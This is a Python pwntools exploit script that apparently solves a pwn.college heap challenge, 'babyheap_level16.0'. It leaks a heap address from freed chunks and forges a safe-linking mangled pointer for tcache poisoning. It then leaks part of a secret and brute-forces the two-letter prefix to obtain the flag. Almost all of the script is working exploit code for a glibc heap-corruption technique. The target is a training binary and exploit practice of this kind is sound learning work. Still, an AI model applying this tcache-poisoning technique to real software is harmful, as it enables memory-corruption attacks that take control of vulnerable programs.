#!/usr/bin/env python3

from pwn import * 
import string
import time

binary = './babyheap_level16.0_patched'

s = '''
b malloc 
b free
'''

# Use both lowercase and uppercase letters
char_set = string.ascii_lowercase + string.ascii_uppercase

# Define a function to try a single prefix
def try_prefix(prefix):
    try:
        # Start a fresh process
        p = process(binary)
        
        # Extract the 6 characters
        try:
            p.sendline("malloc 0 100")
            p.sendline("malloc 1 100")
            p.sendline("free 0")
            p.sendline("free 1")

            p.sendline("puts 0")
            p.recvuntil("Data: ", timeout=1)
            leak = p.recvline(timeout=1).strip()
            leak = u64(leak.ljust(8, b'\x00'))
            leak = leak << 12

            addr = 0x00434fd0 
            chunk_addr = leak + 0x2c0
            mangled_ptr = ((chunk_addr >> 12 ) ^ (addr))

            p.sendline(b"scanf")
            p.sendline("1")
            p.sendline(p64(mangled_ptr))

            p.sendline("malloc 1 100")
            p.sendline("malloc 0 100")
            p.sendline("free 1")
            p.sendline("puts 1")

            p.recvuntil(b"Data: ", timeout=1)
            leak = p.recvline(timeout=1)
                
            leak_str = leak.decode('latin-1')
            six_chars = leak_str[2:8]
            print(f"Extracted 6 characters: {six_chars}")
        except Exception as e:
            print(f"Failed to extract chars: {e}")
            p.close()
            return False
        
        # Try the current password
        try:
            p.sendline(b"send_flag")
            p.recvuntil(b"Secret: ", timeout=1)
            
            password = prefix.encode() + six_chars.encode() + b'\x00' * 8
            p.sendline(password)
            
            response = p.recvline(timeout=1)
            if b"flag" in response.lower() or b"correct" in response.lower() or b"pwn.college" in response.lower():
                print(f"[!] Found correct prefix: {prefix}")
                print(f"[!] Full password: {prefix + six_chars}")
                
                # Attach debugger and go interactive on success
                gdb.attach(p, s)
                p.interactive()
                return True
        except Exception as e:
            print(f"Error checking password: {e}")
        
        p.close()
        return False
    except Exception as e:
        print(f"Overall error with {prefix}: {e}")
        return False

# Bruteforce loop - now includes both lowercase and uppercase letters
print(f"Starting bruteforce with all letters ({len(char_set)}² = {len(char_set)**2} combinations)")
for c1 in char_set:
    for c2 in char_set:
        prefix = c1 + c2
        print(f"Trying prefix: {prefix}")
        
        # Try up to 3 times for each prefix to handle random crashes
        for attempt in range(3):
            result = try_prefix(prefix)
            if result:
                print(f"Success with prefix: {prefix}")
                exit(0)
            # If process crashed, try again (up to 3 times)
            if attempt < 2:
                print(f"Retrying {prefix} (attempt {attempt+2}/3)")
            else:
                break  # Move to next prefix after 3 attempts

print("Bruteforce failed")
